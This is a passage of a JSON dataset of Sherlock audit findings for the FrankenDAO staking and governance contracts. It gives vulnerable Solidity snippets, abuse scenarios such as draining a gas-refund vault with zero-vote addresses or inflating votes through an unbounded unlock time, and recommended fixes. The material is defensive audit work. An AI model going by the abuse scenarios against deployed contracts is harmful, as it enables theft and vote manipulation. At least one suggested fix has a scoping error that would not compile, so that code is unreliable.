Snippet\n\nhttps://github.com/sherlock-audit/2022-11-frankendao/blob/main/src/Staking.sol#L166-L174\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nThere should be a function to emergency eject the token from staking. To prevent abuse a token that has been emergency ejected should be blacklisted from staking again for a certain cooldown period, such as the length of current voting period.\n\n## Discussion\n\n**zobront**\n\nIn the case that a user did this, Admins would create a contract that all \"stuck\" users approve, and they would veto and unstake all tokens in one transaction. It would be inconvenient, but no long term harm would be caused. \n\nI still think it's valid as a Medium, as this is obviously a situation we'd like to avoid being possible.\n\n**zobront**\n\nFixed: https://github.com/Solidity-Guild/FrankenDAO/pull/18",
      "summary": "\nThis bug report is about a vulnerability in the code of a staking system, which allows malicious users to keep their delegatees locked to them indefinitely. The vulnerability is caused by a modifier that reverts when a delegate of msg.sender has voted or currently has an open proposal. A malicious user can abuse this by continuously opening proposals, so that their delegatees are always locked to them. This can prevent delegatees from unstaking or delegating to anyone else. The code snippet of the vulnerability is provided, and the tool used for the audit is manual review. The recommendation is to implement a function to emergency eject tokens from staking, and to blacklist them from staking again for a certain cooldown period. A discussion was also held, which resulted in a fix being implemented.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "FrankenDAO",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2022-11-frankendao-judging/issues/23",
      "tags": [
        "Delegate",
        "DAO"
      ],
      "finders": [
        "rvierdiiev",
        "0x52"
      ]
    },
    {
      "id": "3597",
      "title": "M-5: castVote can be called by anyone even those without votes",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2022-11-frankendao-judging/issues/25 \n\n## Found by \nTrumpero, 0x52, hansfriese\n\n## Summary\n\nGovernance#castVote can be called by anyone, even users that don't have any votes. Since the voting refund is per address, an adversary could use a large number of addresses to vote with zero votes to drain the vault.\n\n## Vulnerability Detail\n\n    function _castVote(address _voter, uint256 _proposalId, uint8 _support) internal returns (uint) {\n        // Only Active proposals can be voted on\n        if (state(_proposalId) != ProposalState.Active) revert InvalidStatus();\n        \n        // Only valid values for _support are 0 (against), 1 (for), and 2 (abstain)\n        if (_support > 2) revert InvalidInput();\n\n        Proposal storage proposal = proposals[_proposalId];\n\n        // If the voter has already voted, revert        \n        Receipt storage receipt = proposal.receipts[_voter];\n        if (receipt.hasVoted) revert AlreadyVoted();\n\n        // Calculate the number of votes a user is able to cast\n        // This takes into account delegation and community voting power\n        uint24 votes = (staking.getVotes(_voter)).toUint24();\n\n        // Update the proposal's total voting records based on the votes\n        if (_support == 0) {\n            proposal.againstVotes = proposal.againstVotes + votes;\n        } else if (_support == 1) {\n            proposal.forVotes = proposal.forVotes + votes;\n        } else if (_support == 2) {\n            proposal.abstainVotes = proposal.abstainVotes + votes;\n        }\n\n        // Update the user's receipt for this proposal\n        receipt.hasVoted = true;\n        receipt.support = _support;\n        receipt.votes = votes;\n\n        // Make these updates after the vote so it doesn't impact voting power for this vote.\n        ++totalCommunityScoreData.votes;\n\n        // We can update the total community voting power with no check because if you can vote, \n        // it means you have votes so you haven't delegated.\n        ++userCommunityScoreData[_voter].votes;\n\n        return votes;\n    }\n\nNowhere in the flow of voting does the function revert if the user calling it doesn't actually have any votes. staking#getVotes won't revert under any circumstances. Governance#_castVote only reverts if 1) the proposal isn't active 2) support > 2 or 3) if the user has already voted. The result is that any user can vote even if they don't have any votes, allowing users to maliciously burn vault funds by voting and claiming the vote refund. \n\n## Impact\n\nVault can be drained maliciously by users with no votes\n\n## Code Snippet\n\nhttps://github.com/sherlock-audit/2022-11-frankendao/blob/main/src/Governance.sol#L607-L646\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nGovernance#_castVote should revert if msg.sender doesn't have any votes:\n\n        // Calculate the number of votes a user is able to cast\n        // This takes into account delegation and community voting power\n        uint24 votes = (staking.getVotes(_voter)).toUint24();\n\n    +   if (votes == 0) revert NoVotes();\n\n        // Update the proposal's total voting records based on the votes\n        if (_support == 0) {\n            proposal.againstVotes = proposal.againstVotes + votes;\n        } else if (_support == 1) {\n            proposal.forVotes = proposal.forVotes + votes;\n        } else if (_support == 2) {\n            proposal.abstainVotes = proposal.abstainVotes + votes;\n        }\n\n## Discussion\n\n**zobront**\n\nThis is great and will fix, but an adversary being able to burn a small pool put aside for gas refunds for no personal benefit seems like a Medium, not a High.\n\n**ZakkMan**\n\nFixed: https://github.com/Solidity-Guild/FrankenDAO/pull/21",
      "summary": "\nThis bug report concerns the Governance#castVote function of the FrankenDAO smart contract. The issue is that this function can be called by anyone, even users who do not have any votes, allowing them to maliciously burn vault funds by voting and claiming the vote refund. The code snippet provided in the report shows that the function only reverts if 1) the proposal isn't active 2) support > 2 or 3) if the user has already voted, meaning users can vote even if they don't have any votes. The impact of this vulnerability is that the vault can be drained maliciously by users with no votes. A recommendation is given to add a check to Governance#_castVote to revert if the user calling it doesn't actually have any votes. A discussion follows between two users, with the issue eventually being fixed in a pull request.",
      "quality_score": 5,
      "rarity_score": 2,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "FrankenDAO",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2022-11-frankendao-judging/issues/25",
      "tags": [
        "Vote",
        "DAO"
      ],
      "finders": [
        "Trumpero",
        "0x52",
        "hansfriese"
      ]
    },
    {
      "id": "3596",
      "title": "M-4: `queue()` should increase `proposalsPassed` instead of `proposalsCreated`",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2022-11-frankendao-judging/issues/54 \n\n## Found by \nTrumpero, rvierdiiev, 0x52, WATCHPUG, neumo, cccz, John, hansfriese\n\n## Summary\n\n`proposalsCreated` will be increased in `verifyProposal()`, `queue()` should increase `proposalsPassed`.\n\n## Vulnerability Detail\n\nBased on the context, `queue()` should increase `userCommunityScoreData[proposal.proposer].proposalsPassed` and `totalCommunityScoreData.proposalsPassed` instead.\n\n## Impact\n\nDue to the presence of `setProposalsCreatedMultiplier()` and `setProposalsPassedMultiplier()`, the multiplier of both scores can be different, when that's the case, the proposer's voting power bonuses will be wrongly calculated because `proposalsPassed` is not correctly increased in `queue()`.\n\n## Code Snippet\n\nhttps://github.com/sherlock-audit/2022-11-frankendao/blob/main/src/Governance.sol#L467-L495\n\nhttps://github.com/sherlock-audit/2022-11-frankendao/blob/main/src/Staking.sol#L592-L601\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nChange to:\n\n```diff\n    function queue(uint256 _proposalId) external {\n        // Succeeded means we're past the endTime, yes votes outweigh no votes, and quorum threshold is met\n        if(state(_proposalId) != ProposalState.Succeeded) revert InvalidStatus();\n        \n        Proposal storage proposal = proposals[_proposalId];\n\n        // Set the ETA (time for execution) to the soonest time based on the Executor's delay\n        uint256 eta = block.timestamp + executor.DELAY();\n        proposal.eta = eta.toUint32();\n\n        // Queue separate transactions for each action in the proposal\n        uint numTargets = proposal.targets.length;\n        for (uint256 i = 0; i < numTargets; i++) {\n            executor.queueTransaction(proposal.targets[i], proposal.values[i], proposal.signatures[i], proposal.calldatas[i], eta);\n        }\n\n        // If a proposal is queued, we are ready to award the community voting power bonuses to the proposer\n-        ++userCommunityScoreData[proposal.proposer].proposalsCreated;\n+        ++userCommunityScoreData[proposal.proposer].proposalsPassed;\n\n        // We don't need to check whether the proposer is accruing community voting power because\n        // they needed that voting power to propose, and once they have an Active Proposal, their\n        // tokens are locked from delegating and unstaking.\n-        ++totalCommunityScoreData.proposalsCreated;\n+        ++totalCommunityScoreData.proposalsPassed;\n        \n        // Remove the proposal from the Active Proposals array\n        _removeFromActiveProposals(_proposalId);\n\n        emit ProposalQueued(_proposalId, eta);\n    }\n```\n\n## Discussion\n\n**ZakkMan**\n\nFixed: https://github.com/Solidity-Guild/FrankenDAO/pull/20",
      "summary": "\nThis bug report is about the `queue()` function in the code of a smart contract called FrankenDAO. The bug is that `proposalsCreated` is increased in `verifyProposal()`, but `queue()` should increase `proposalsPassed` instead. This issue was found by Trumpero, rvierdiiev, 0x52, WATCHPUG, neumo, cccz, John, and hansfriese.\n\nThe impact of this bug is that due to the presence of `setProposalsCreatedMultiplier()` and `setProposalsPassedMultiplier()`, the multiplier of both scores can be different, so the proposer's voting power bonuses will be wrongly calculated because `proposalsPassed` is not correctly increased in `queue()`.\n\nThe code snippet for this bug can be found in the following two files: \n- Governance.sol: Lines 467-495\n- Staking.sol: Lines 592-601\n\nThe bug was fixed with a pull request on GitHub by ZakkMan. The recommendation was to change the code in the `queue()` function so that `proposalsPassed` is increased instead of `proposalsCreated`.",
      "quality_score": 3,
      "rarity_score": 1,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "FrankenDAO",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2022-11-frankendao-judging/issues/54",
      "tags": [],
      "finders": [
        "0x52",
        "cccz",
        "neumo",
        "WATCHPUG",
        "Trumpero",
        "hansfriese",
        "John",
        "rvierdiiev"
      ]
    },
    {
      "id": "3595",
      "title": "M-3: Using `ERC721.transferFrom()` instead of `safeTransferFrom()` may cause the user's NFT to be frozen in a contract that does not support ERC721",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2022-11-frankendao-judging/issues/55 \n\n## Found by \nsaian, rvierdiiev, WATCHPUG, Tomo, Bnke0x0, Nyx\n\n## Summary\n\nThere are certain smart contracts that do not support ERC721, using `transferFrom()` may result in the NFT being sent to such contracts.\n\n## Vulnerability Detail\n\nIn `unstake()`, `_to` is param from user's input.\n\nHowever, if `_to` is a contract address that does not support ERC721, the NFT can be frozen in that contract.\n\nAs per the documentation of EIP-721:\n\n> A wallet/broker/auction application MUST implement the wallet interface if it will accept safe transfers.\n\nRef: https://eips.ethereum.org/EIPS/eip-721\n\n## Impact\n\nThe NFT may get stuck in the contract that does support ERC721.\n\n## Code Snippet\n\nhttps://github.com/sherlock-audit/2022-11-frankendao/blob/main/src/Staking.sol#L463-L489\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nConsider using `safeTransferFrom()` instead of `transferFrom()`.\n\n## Discussion\n\n**zobront**\n\nFixed: https://github.com/Solidity-Guild/FrankenDAO/pull/10",
      "summary": "\nThis bug report is about a vulnerability found in the smart contract code of the \"FrankenDAO\" project. The vulnerability is related to the use of `ERC721.transferFrom()` instead of `safeTransferFrom()` when sending a Non-Fungible Token (NFT). The issue was discovered by a group of people including saian, rvierdiiev, WATCHPUG, Tomo, Bnke0x0, Nyx. \n\nUsing `transferFrom()` may result in the NFT being sent to a contract that does not support ERC721, thus freezing the NFT in the contract. This is because, according to the EIP-721 documentation, a wallet, broker or auction application must implement the wallet interface if it will accept safe transfers.\n\nThe impact of this vulnerability is that the NFT may get stuck in the contract that does not support ERC721. The code snippet related to this issue can be found at the given link. The vulnerability was discovered through manual review and the recommended solution is to consider using `safeTransferFrom()` instead of `transferFrom()`. The issue was fixed by zobront and the fix can be found at the given link.",
      "quality_score": 3,
      "rarity_score": 5,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "FrankenDAO",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2022-11-frankendao-judging/issues/55",
      "tags": [
        "transferFrom vs safeTransferFrom",
        "NFT",
        "ERC721"
      ],
      "finders": [
        "Nyx",
        "WATCHPUG",
        "Bnke0x0",
        "saian",
        "rvierdiiev",
        "Tomo"
      ]
    },
    {
      "id": "3594",
      "title": "M-2: [Medium-1] Hardcoded `monsterMultiplier` in case of `stakedTimeBonus` disregards the updates done to  `monsterMultiplier` through `setMonsterMultiplier()`",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2022-11-frankendao-judging/issues/56 \n\n## Found by \ncuriousapple, hansfriese\n\n## Summary\n[Medium-1] Hardcoded monsterMultiplier in case of ``stakedTimeBonus`` disregards the updates done to  ``monsterMultiplier`` through ``setMonsterMultiplier()``\n\n## Vulnerability Detail\nFrankenDAO allows users to stake two types of NFTs, `Frankenpunks` and `Frankenmonsters` , one of which is considered more valuable, ie: `Frankenpunks`, \n\nThis is achieved by reducing votes applicable for `Frankenmonsters` by `monsterMultiplier`.\n\n```solidity\nfunction getTokenVotingPower(uint _tokenId) public override view returns (uint) {\n      if (ownerOf(_tokenId) == address(0)) revert NonExistentToken();\n\n      // If tokenId < 10000, it's a FrankenPunk, so 100/100 = a multiplier of 1\n      uint multiplier = _tokenId < 10_000 ? PERCENT : monsterMultiplier;\n      \n      // evilBonus will return 0 for all FrankenMonsters, as they are not eligible for the evil bonus\n      return ((baseVotes * multiplier) / PERCENT) + stakedTimeBonus[_tokenId] + evilBonus(_tokenId);\n    }\n```\n\nThis `monsterMultiplier` is initially set as 50 and could be changed by governance proposal.\n\n```solidity\nfunction setMonsterMultiplier(uint _monsterMultiplier) external onlyExecutor {\n    emit MonsterMultiplierChanged(monsterMultiplier = _monsterMultiplier); \n  }\n```\n\nHowever, one piece of code inside the FrakenDAO staking contract doesn't consider this and has a monster multiplier hardcoded.\n\n```solidity\nfunction stake(uint[] calldata _tokenIds, uint _unlockTime) \n----\nfunction _stakeToken(uint _tokenId, uint _unlockTime) internal returns (uint) {\n   if (_unlockTime > 0) {\n     --------\n      stakedTimeBonus[_tokenId] = _tokenId < 10000 ? **fullStakedTimeBonus : fullStakedTimeBonus / 2;** \n    }\n--------\n```\n\nHence any update done to `monsterMultiplier` would not reflect in the calculation of `stakedTimeBonus`, and thereby votes.\n\n## Impact : Medium\nAny update done to monsterMultiplier would not be reflected in stakedTimeBonus; it would always remain as /2 or 50%.\n\n## Likelihood: Medium\nOne needs to pass a governance proposal to change the monster multiplier, so this is definitely not a high likelihood; it's not low as well, as there is a clear provision in spec regarding this.\n\n## Code Snippet\nhttps://github.com/sherlock-audit/2022-11-frankendao/blob/main/src/Staking.sol#L393\n\n## Tool used\n\nManual Review\n\n## Recommendation\nConsider replacing the hardcoded value with monsterMultiplier\n\n## Discussion\n\n**zobront**\n\nFixed: https://github.com/Solidity-Guild/FrankenDAO/pull/12",
      "summary": "\nThe FrankenDAO staking contract allows users to stake two types of Non-Fungible Tokens (NFTs), `Frankenpunks` and `Frankenmonsters`. The `Frankenpunks` are considered more valuable and votes applicable for `Frankenmonsters` are reduced by a `monsterMultiplier`. This `monsterMultiplier` is initially set as 50 and could be changed by governance proposal through the `setMonsterMultiplier()` function. However, one piece of code inside the FrakenDAO staking contract disregards this and has a monster multiplier hardcoded as 50. This means that any update done to `monsterMultiplier` would not reflect in the calculation of `stakedTimeBonus`, and thereby votes. This vulnerability has a medium impact and likelihood. The recommendation is to consider replacing the hardcoded value with `monsterMultiplier`. The issue was fixed by a pull request.",
      "quality_score": 3,
      "rarity_score": 5,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "FrankenDAO",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2022-11-frankendao-judging/issues/56",
      "tags": [
        "Hardcoded Setting"
      ],
      "finders": [
        "curiousapple",
        "hansfriese"
      ]
    },
    {
      "id": "3593",
      "title": "M-1: [Tomo-M3] Use safeMint instead of mint for ERC721",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2022-11-frankendao-judging/issues/65 \n\n## Found by \nTomo\n\n## Summary\n\nUse safeMint instead of mint for ERC721\n\n## Vulnerability Detail\n\nThe `msg.sender` will be minted as a proof of staking NFT when `_stakeToken()` is called. \n\nHowever, if `msg.sender` is a contract address that does not support ERC721, the NFT can be frozen in the contract.\n\nAs per the documentation of EIP-721:\n\n> A wallet/broker/auction application MUST implement the wallet interface if it will accept safe transfers.\n> \n\nRef: [https://eips.ethereum.org/EIPS/eip-721](https://eips.ethereum.org/EIPS/eip-721)\n\nAs per the documentation of ERC721.sol by Openzeppelin\n\nRef: [https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC721/ERC721.sol#L274-L285](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC721/ERC721.sol#L274-L285)\n\n```solidity\n/**\n * @dev Mints `tokenId` and transfers it to `to`.\n *\n * WARNING: Usage of this method is discouraged, use {_safeMint} whenever possible\n *\n * Requirements:\n *\n * - `tokenId` must not exist.\n * - `to` cannot be the zero address.\n *\n * Emits a {Transfer} event.\n */\nfunction _mint(address to, uint256 tokenId) internal virtual {\n```\n\n## Impact\n\nUsers possibly lose their NFTs\n\n## Code Snippet\nhttps://github.com/sherlock-audit/2022-11-frankendao/blob/main/src/Staking.sol#L411\n``` solidity\n  _mint(msg.sender, _tokenId);\n```\n## Tool used\n\nManual Review\n\n## Recommendation\n\nUse `safeMint` instead of `mint` to check received address support for ERC721 implementation.\n\n[https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC721/ERC721.sol#L262](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC721/ERC721.sol#L262)\n\n## Discussion\n\n**zobront**\n\nI might consider this a duplicate of #55 but not sure how this is usually judged. We will be changing this function based on other issues to not allow \"approved\" spenders, so msg.sender will be the owner of the FrankenPunk, which ensures they are able to hold NFTs.\n\n**zobront**\n\nFixed: https://github.com/Solidity-Guild/FrankenDAO/pull/14\n\nI didn't need to add safeMint, as I made a change for another issue that removed the ability to non holder to unstake, which means they have the ability to hold NFTs.",
      "summary": "\nThis bug report is about an issue found by Tomo in the code of the Sherlock Audit project. The issue is related to the minting of an ERC721 token when the _stakeToken() function is called. The problem is that if the `msg.sender` is a contract address that does not support ERC721, the token can be frozen in the contract. This could lead to users losing their NFTs. The code snippet provided is from the Staking.sol file, line 411, which shows the `_mint(msg.sender, _tokenId)` function.\n\nThe recommendation is to use the `safeMint` function instead of `mint` to check if the received address supports ERC721 implementation. This is in line with the documentation of EIP-721, which states that a wallet/broker/auction application must implement the wallet interface if it will accept safe transfers. The code for the `safeMint` function can be found in the ERC721.sol file by Openzeppelin.\n\nThe issue was fixed in the Pull Request #14 by zobront, who did not need to add `safeMint`, as they made a change for another issue that removed the ability to non-holder to unstake, which ensured they had the ability to hold NFTs.",
      "quality_score": 3,
      "rarity_score": 5,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "FrankenDAO",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2022-11-frankendao-judging/issues/65",
      "tags": [
        "NFT",
        "mint vs safeMint",
        "ERC721"
      ],
      "finders": [
        "Tomo"
      ]
    },
    {
      "id": "3592",
      "title": "H-4: Staking#_unstake removes votes from wrong person if msg.sender != owner",
      "impact": "HIGH",
      "content": "Source: https://github.com/sherlock-audit/2022-11-frankendao-judging/issues/30 \n\n## Found by \n0x52, cccz\n\n## Summary\n\nStaking#_unstake allows any msg.sender to unstake tokens for any owner that has approved them. The issue is that even when msg.sender != owner the votes are removed from msg.sender instead of owner. The result is that the owner keeps their votes and msg.sender loses theirs. This could be abused to hijack or damage voting.\n\n## Vulnerability Detail\n\n    address owner = ownerOf(_tokenId);\n    if (msg.sender != owner && !isApprovedForAll[owner][msg.sender] && msg.sender != getApproved[_tokenId]) revert NotAuthorized();\n\nStaking#_unstake allows any msg.sender to unstake tokens for any owner that has approved them.\n\n    uint lostVotingPower;\n    for (uint i = 0; i < numTokens; i++) {\n        lostVotingPower += _unstakeToken(_tokenIds[i], _to);\n    }\n\n    votesFromOwnedTokens[msg.sender] -= lostVotingPower;\n    // Since the delegate currently has the voting power, it must be removed from their balance\n    // If the user doesn't delegate, delegates(msg.sender) will return self\n    tokenVotingPower[getDelegate(msg.sender)] -= lostVotingPower;\n    totalTokenVotingPower -= lostVotingPower;\n\nAfter looping through _unstakeToken all accumulated votes are removed from msg.sender. The problem with this is that msg.sender is allowed to unstake tokens for users other than themselves and in these cases they will lose votes rather than the user who owns the token.\n\nExample:\nUser A and User B both stake tokens and have 10 votes each. User A approves User B to unstake their tokens. User B calls unstake for User A. User B is msg.sender and User A is owner. The votes should be removed from owner but instead are removed from msg.sender. The result is that after unstaking User B has a vote balance of 0 while still having their locked token and User B has a vote balance of 10 and their token back. Now User B is unable to unstake their token because their votes will underflow on unstake, permanently trapping their NFT.\n\n## Impact\n\nVotes are removed incorrectly if msg.sender != owner. By extension this would forever trap msg.sender tokens in the contract.\n\n## Code Snippet\n\nhttps://github.com/sherlock-audit/2022-11-frankendao/blob/main/src/Staking.sol#L427-L458\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nRemove the ability for users to unstake for other users\n\n## Discussion\n\n**zobront**\n\nFixed: https://github.com/Solidity-Guild/FrankenDAO/pull/14",
      "summary": "\nA bug was found in the Staking contract of the FrankenDAO project where any msg.sender is allowed to unstake tokens for any owner that has approved them. The issue is that even when msg.sender != owner the votes are removed from msg.sender instead of owner. This could be abused to hijack or damage voting. For example, User A and User B both stake tokens and have 10 votes each. User A approves User B to unstake their tokens. User B calls unstake for User A. User B is msg.sender and User A is owner. The votes should be removed from owner but instead are removed from msg.sender. This would result in User B having a vote balance of 0 while still having their locked token and User B having a vote balance of 10 and their token back. Now User B is unable to unstake their token because their votes will underflow on unstake, permanently trapping their NFT.\n\nThe bug was discovered by 0x52 and cccz using manual review. The code snippet can be found at https://github.com/sherlock-audit/2022-11-frankendao/blob/main/src/Staking.sol#L427-L458. The recommendation is to remove the ability for users to unstake for other users. The bug was fixed with the pull request https://github.com/Solidity-Guild/FrankenDAO/pull/14.",
      "quality_score": 5,
      "rarity_score": 5,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "FrankenDAO",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2022-11-frankendao-judging/issues/30",
      "tags": [
        "Vote"
      ],
      "finders": [
        "cccz",
        "0x52"
      ]
    },
    {
      "id": "3591",
      "title": "H-3: Unbounded `_unlockTime` allows the attacker to get a huge `stakedTimeBonus` and dominate the voting",
      "impact": "HIGH",
      "content": "Source: https://github.com/sherlock-audit/2022-11-frankendao-judging/issues/53 \n\n## Found by \nTrumpero, WATCHPUG, neumo, bin2chen, curiousapple, koxuan, John, hansfriese\n\n## Summary\n\n`stakingSettings.maxStakeBonusTime` is not enforced, allowing the attacker to gain a huge `stakedTimeBonus` by using a huge value for `_unlockTime`.\n\n## Vulnerability Detail\n\nThere is no max `_unlockTime` check in `_stakeToken()` to enforce the `stakingSettings.maxStakeBonusTime`.\n\nAs a result, an attacker can set a huge value for `_unlockTime` and get an enormous `stakedTimeBonus`.\n\n## Impact\n\nThe attacker can get a huge amount of votes and dominate the voting.\n\n## Code Snippet\n\nhttps://github.com/sherlock-audit/2022-11-frankendao/blob/main/src/Staking.sol#L389-L394\n\nhttps://github.com/sherlock-audit/2022-11-frankendao/blob/main/src/Staking.sol#L356-L384\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nChange to:\n\n```solidity\n  function _stakeToken(uint _tokenId, uint _unlockTime) internal returns (uint) {\n    if (_unlockTime > 0) {\n      unlockTime[_tokenId] = _unlockTime;\n      uint time = _unlockTime - block.timestamp;\n      uint maxtime = stakingSettings.maxStakeBonusTime;\n      uint maxBonus = stakingSettings.maxStakeBonusAmount;\n      if (time < stakingSettings.maxStakeBonusTime){\n        uint fullStakedTimeBonus = (time * maxBonus) / maxtime;\n      }else{\n        uint fullStakedTimeBonus = maxBonus;\n      }\n      stakedTimeBonus[_tokenId] = _tokenId < 10000 ? fullStakedTimeBonus : fullStakedTimeBonus / 2;\n    }\n```\n\n## Discussion\n\n**zobront**\n\nFixed: https://github.com/Solidity-Guild/FrankenDAO/pull/13",
      "summary": "\nThis bug report concerns a vulnerability in the code of the FrankenDAO project, which was found by Trumpero, WATCHPUG, neumo, bin2chen, curiousapple, koxuan, John, and hansfriese. The vulnerability is that there is no maximum `_unlockTime` check in the `_stakeToken()` function, which allows an attacker to set a large value for `_unlockTime` and obtain an excessively big `stakedTimeBonus`. This would allow the attacker to gain a large number of votes and dominate the voting. The code snippet provided shows the code that needs to be changed to fix this vulnerability. A Pull Request was created by zobront, which fixed the issue.",
      "quality_score": 5,
      "rarity_score": 5,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "FrankenDAO",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2022-11-frankendao-judging/issues/53",
      "tags": [
        "Min/Max Cap Validation"
      ],
      "finders": [
        "curiousapple",
        "bin2chen",
        "koxuan",
        "WATCHPUG",
        "Trumpero",
        "John",
        "hansfriese",
        "neumo"
      ]
    },
    {
      "id": "3590",
      "title": "H-2: `Staking.unstake()` doesn't decrease the original voting power that was used in `Staking.stake()`.",
      "impact": "HIGH",
      "content": "Source: https://github.com/sherlock-audit/2022-11-frankendao-judging/issues/70 \n\n## Found by \nHaruxe, 0x52, hansfriese\n\n## Summary\n`Staking.unstake()` doesn't decrease the original voting power that was used in `Staking.stake()`.\n\n## Vulnerability Detail\nWhen users stake/unstake the underlying NFTs, it calculates the token voting power using [getTokenVotingPower()](https://github.com/sherlock-audit/2022-11-frankendao/blob/main/src/Staking.sol#L507-L515) and increases/decreases their voting power accordingly.\n\n```solidity\n    function getTokenVotingPower(uint _tokenId) public override view returns (uint) {\n      if (ownerOf(_tokenId) == address(0)) revert NonExistentToken();\n\n      // If tokenId < 10000, it's a FrankenPunk, so 100/100 = a multiplier of 1\n      uint multiplier = _tokenId < 10_000 ? PERCENT : monsterMultiplier;\n      \n      // evilBonus will return 0 for all FrankenMonsters, as they are not eligible for the evil bonus\n      return ((baseVotes * multiplier) / PERCENT) + stakedTimeBonus[_tokenId] + evilBonus(_tokenId);\n    }\n```\n\nBut `getTokenVotingPower()` uses some parameters like `monsterMultiplier` and `baseVotes` and the output would be changed for the same `tokenId` after the admin changed these settings.\n\nCurrently, `_stake()` and `_unstake()` calculates the token voting power independently and the below scenario would be possible.\n\n- At the first time, `baseVotes = 20, monsterMultiplier = 50`.\n- A user staked a `FrankenMonsters` and his voting power = 10 [here](https://github.com/sherlock-audit/2022-11-frankendao/blob/main/src/Staking.sol#L369-L371).\n- After that, the admin changed `monsterMultiplier = 60`.\n- When a user tries to unstake the NFT, the token voting power will be `20 * 60 / 100 = 12` [here](https://github.com/sherlock-audit/2022-11-frankendao/blob/main/src/Staking.sol#L514).\n- So it will revert with uint underflow [here](https://github.com/sherlock-audit/2022-11-frankendao/blob/main/src/Staking.sol#L436).\n- After all, he can't unstake the NFT.\n\n## Impact\n`votesFromOwnedTokens` might be updated wrongly or users can't unstake for the worst case because it doesn't decrease the same token voting power while unstaking.\n\n## Code Snippet\nhttps://github.com/sherlock-audit/2022-11-frankendao/blob/main/src/Staking.sol#L427-L440\n\n## Tool used\nManual Review\n\n## Recommendation\nI think we should add a mapping like `tokenVotingPower` to save an original token voting power when users stake the token and decrease the same amount when they unstake.\n\n## Discussion\n\n**zobront**\n\nFixed: https://github.com/Solidity-Guild/FrankenDAO/pull/17",
      "summary": "\nThis bug report is about an issue found in the code of the FrankenDAO, a decentralized autonomous organization. The issue is that when users stake and unstake the underlying NFTs (non-fungible tokens), the token voting power is not being decreased accordingly. This is due to the fact that `getTokenVotingPower()` uses some parameters like `monsterMultiplier` and `baseVotes` and the output would be changed for the same `tokenId` after the admin changed these settings. As a result, users cannot unstake their NFTs and `votesFromOwnedTokens` might be updated wrongly. \n\nThe issue was found by Haruxe, 0x52, and hansfriese and was fixed by zobront in the following pull request: https://github.com/Solidity-Guild/FrankenDAO/pull/17. The recommendation given was to add a mapping like `tokenVotingPower` to save an original token voting power when users stake the token and decrease the same amount when they unstake.",
      "quality_score": 5,
      "rarity_score": 5,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "FrankenDAO",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2022-11-frankendao-judging/issues/70",
      "tags": [
        "DAO",
        "Add/Subtract Match"
      ],
      "finders": [
        "Haruxe",
        "0x52",
        "hansfriese"
      ]
    },
    {
      "id": "3589",
      "title": "H-1: The total community voting power is updated incorrectly when a user delegates.",
      "impact": "HIGH",
      "content": "Source: https://github.com/sherlock-audit/2022-11-frankendao-judging/issues/91 \n\n## Found by \nTrumpero, curiousapple, hansfriese\n\n## Summary\nWhen a user delegates their voting power from staked tokens, the total community voting power should be updated. But the update logic is not correct, the the total community voting power could be wrong values.\n\n## Vulnerability Detail\n\n```solidity\n    tokenVotingPower[currentDelegate] -= amount;\n    tokenVotingPower[_delegatee] += amount; \n\n    // If a user is delegating back to themselves, they regain their community voting power, so adjust totals up\n    if (_delegator == _delegatee) {\n      _updateTotalCommunityVotingPower(_delegator, true);\n\n    // If a user delegates away their votes, they forfeit their community voting power, so adjust totals down\n    } else if (currentDelegate == _delegator) {\n      _updateTotalCommunityVotingPower(_delegator, false);\n    }\n```\nWhen the total community voting power is increased in the first if statement, `_delegator`'s token voting power might be positive already and community voting power might be added to total community voting power before.\n\nAlso, `currentDelegate`'s token voting power might be still positive after delegation so we shouldn't remove the communitiy voting power this time.\n\n## Impact\nThe total community voting power can be incorrect.\n\n## Code Snippet\nhttps://github.com/sherlock-audit/2022-11-frankendao/blob/main/src/Staking.sol#L293-L313\n\n## Tool used\nManual Review\n\n## Recommendation\nAdd more conditions to check if the msg.sender delegated or not.\n\n```solidity\n    if (_delegator == _delegatee) {\n        if(tokenVotingPower[_delegatee] == amount) {\n            _updateTotalCommunityVotingPower(_delegator, true);\n        }\n        if(tokenVotingPower[currentDelegate] == 0) {\n            _updateTotalCommunityVotingPower(currentDelegate, false);      \n        }\n    } else if (currentDelegate == _delegator) {\n        if(tokenVotingPower[_delegatee] == amount) {\n            _updateTotalCommunityVotingPower(_delegatee, true);\n        }\n        if(tokenVotingPower[_delegator] == 0) {\n            _updateTotalCommunityVotingPower(_delegator, false);      \n        }\n    }\n```\n\n## Discussion\n\n**zobront**\n\nFixed: https://github.com/Solidity-Guild/FrankenDAO/pull/15\n\nNote for JTP: 